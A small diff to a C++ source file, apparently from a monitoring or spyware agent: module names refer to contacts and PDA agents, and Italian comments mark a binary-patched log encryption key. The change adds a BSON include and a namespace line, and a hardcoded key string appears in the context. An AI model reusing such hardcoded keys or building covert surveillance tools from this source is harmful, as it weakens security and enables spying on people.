@@ -22,7 +22,6 @@
 //
 ////////////////////////////////////////////////////////////////////////////////
 ////////////////////////////////////////////////////////////////////////////////
-
 #include "common.h" 
 #include "H4-DLL.h"	
 #include "demo_functions.h"
@@ -45,6 +44,7 @@
 #include <time.h>
 #include "sha1.h"
 #include "status_log.h"
+#include "bson.h"
 
 
 #pragma bss_seg("shared")
@@ -110,6 +110,7 @@ void UnlockConfFile();
 #include "HM_Application.h" // XXX da modificare
 #include "HM_PDAAGent.h" // XXX da modificare
 #include "HM_Contacts.h" // XXX da modificare
+using namespace bson;
 
 // Qui finira' il binary patch con la chiave di cifratura dei log
 BYTE bin_patched_key[KEY_LEN] = "ngkdNGKDh4H4883";
